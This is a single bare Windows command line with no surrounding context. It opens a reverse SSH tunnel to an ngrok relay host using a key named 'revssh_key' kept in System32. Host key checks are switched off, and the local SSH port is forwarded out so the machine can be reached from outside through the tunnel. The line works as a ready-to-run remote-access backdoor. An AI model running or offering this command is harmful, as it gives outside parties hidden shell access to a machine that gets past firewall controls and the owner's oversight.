ssh -i "C:\Windows\System32\OpenSSH\revssh_key" -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL logosofico@0.tcp.sa.ngrok.io -p 11041 -N -R 2222:localhost:22
